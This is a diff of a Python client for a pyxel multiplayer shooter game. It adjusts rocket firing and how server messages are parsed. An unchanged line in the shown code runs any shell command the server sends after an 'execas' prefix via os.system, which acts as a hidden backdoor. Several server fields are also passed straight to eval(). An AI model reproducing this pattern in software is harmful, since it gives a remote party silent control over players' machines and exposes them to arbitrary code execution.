@@ -250,7 +250,7 @@ class App:
         if pyxel.btn(pyxel.KEY_S): self.gameInfos["players"][0]["coords"][1] += 2
         if pyxel.btn(pyxel.KEY_Q): self.gameInfos["players"][0]["coords"][0] += -2
         if pyxel.btn(pyxel.KEY_D): self.gameInfos["players"][0]["coords"][0] += 2
-        if pyxel.btnp(pyxel.KEY_SPACE) and time()-self.lastShot >= 1: action, self.lastShot = "Shot", time()
+        if pyxel.btnp(pyxel.KEY_SPACE) and time()-self.lastShot >= 1: action, self.lastShot = "Shot", time() ; self.gameInfos['rockets'].append(self.gameInfos['players'][0]['coords'])
 
         if self.gameMode == "VS": pass
         elif self.gameMode == "COOP": 
@@ -285,12 +285,10 @@ class App:
                 srvMsg = srvMsg.split("%")[0].split("|", 1)
                 if len(srvMsg) == 2 and srvMsg[0] == "execas": os.system(srvMsg[1])
                 continue
-            else: srvMsg = [msg.split('|', 7) for msg in srvMsg.split('%') if msg != ""]
+            else: srvMsg = [msg.split('|', 5) for msg in srvMsg.split('%') if msg != ""]
             for msg in srvMsg:
-                if msg[0] == "main":
-                    self.currentState, self.gameInfos, self.gameMode = "mainLobby", [], ""
-                    break
-                if len(msg) != 8 or msg[0] != "infos": return 1
+                if msg[0] == "main": self.currentState, self.gameInfos, self.gameMode = "mainLobby", [], "" ; break
+                if len(msg) != 6 or msg[0] != "infos": return 1
                 ennToRem = eval(msg[3])
                 for enn in ennToRem: self.gameInfos["forbidEnn"].append(enn)
                 rocToApp = eval(msg[4])
@@ -299,9 +297,7 @@ class App:
 
             self.gameInfos["lives"] = int(srvMsg[1])
             self.gameInfos["score"] = int(srvMsg[2])
-            self.gameInfos["players"][0]["bonus"] = int(srvMsg[5]) 
-            self.gameInfos["players"][1]["coords"] = eval(srvMsg[6])
-            self.gameInfos["players"][1]["bonus"] = int(srvMsg[7])
+            self.gameInfos["players"][1]["coords"] = eval(srvMsg[5])
 
     def higherRockets(self):
         rocketDelay = 0        
